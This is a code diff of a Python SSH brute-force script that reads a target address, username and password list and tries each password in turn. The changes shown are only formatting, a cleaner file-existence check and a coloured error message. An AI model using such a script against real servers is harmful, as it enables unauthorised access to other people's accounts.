@@ -1,5 +1,6 @@
 import paramiko, sys, os, socket, termcolor
 
+
 # 3. Connects to machine via SSH
 def ssh_connect(password, code=0):
     # Setup
@@ -17,6 +18,7 @@ def ssh_connect(password, code=0):
     ssh.close()
     return code
 
+
 # 1. Retrival of info
 host = input('[+] Target Address: ')
 username = input('[+] SSH Username: ')
@@ -24,7 +26,7 @@ input_file = input('[+] Passwords File: ')
 print('\n')
 
 # 2. Checks if file path exists
-if os.path.exists(input_file) == False:
+if not os.path.exists(input_file):
     print('[!!] That File/Path Doesnt Exist')
     sys.exit(1)
 
@@ -42,7 +44,7 @@ with open(input_file, 'r') as file:
             elif response == 1:
                 print('[-] Incorrect Login: ' + password)
             elif response == 2:
-                print('[!!] Cant Connect')
+                print(termcolor.colored('[!!] Cant Connect', 'red'))
                 sys.exit(1)
         except Exception as e:
             print(e)
